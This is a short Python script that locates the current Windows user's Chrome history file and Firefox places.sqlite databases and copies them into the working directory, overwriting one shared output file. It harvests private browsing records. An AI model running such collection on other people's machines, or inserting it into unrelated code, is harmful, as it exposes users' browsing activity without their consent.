import shutil
import os
import getpass
import os.path
import glob

curDir = os.getcwd()
user = getpass.getuser()
chromePath = r"C:\Users\%s\AppData\Local\Google\Chrome\User Data\Default\history" %user
chromeCheck = os.path.exists(chromePath)
mozillaPath = r"C:\Users\%s\AppData\Roaming\Mozilla\Firefox\Profiles" %user
mozillaCheck = os.path.exists(mozillaPath)

if chromeCheck == True:
    shutil.copy(chromePath, r"%s\history" %curDir )

if mozillaCheck == True:
    sqliteFiles = [os.path.join(root, name)
                for root, dirs, files in os.walk(mozillaPath)
                for name in files
                if name.endswith(".sqlite")]

    for f in sqliteFiles:
        if "places.sqlite" in f:
            shutil.copy(f, r"%s\history" %curDir )
    

